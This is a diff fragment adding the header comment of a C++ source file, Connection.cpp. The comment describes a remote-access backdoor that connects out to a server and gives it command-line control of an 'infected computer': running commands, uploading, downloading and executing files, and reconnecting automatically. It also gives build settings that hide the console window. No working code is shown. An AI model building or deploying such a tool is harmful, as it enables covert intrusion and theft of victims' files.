@@ -1,3 +1,27 @@
+//
+// Connection.cpp
+//
+//
+// The program attempts to connect to a server and port
+// specified on the command line or hard coded. Once connected,
+// it gives a command line access of the infected computer to the
+// remote server. The tested commands are the DOS commands dir, mkdir, 
+// rmdir and del (delete files only)(more DOS may be working), and 
+// the commands cd, get [FileName] (download file), put [FileName] (upload file) 
+// and start [FileName] (execute file located on infected PC).
+// If the program loses connection to the remote server, it will 
+// try to reconnect unless the connection was interupted via the "exit" command.
+//
+// Compile and link with wsock32.lib.
+// Targeting the /SUBSYSTEM:windows, with mainCRTStartup entry point
+//
+// Pass the server name and port number on the command line. 
+//
+// Example: Client.exe MyMachineName|IP 2030
+//
+// Written by: Alexandre Cox
+// Date: 04/04/2018
+//
 #include "Connection.h"
 #include "Connection_error.h"
 #include <sstream>
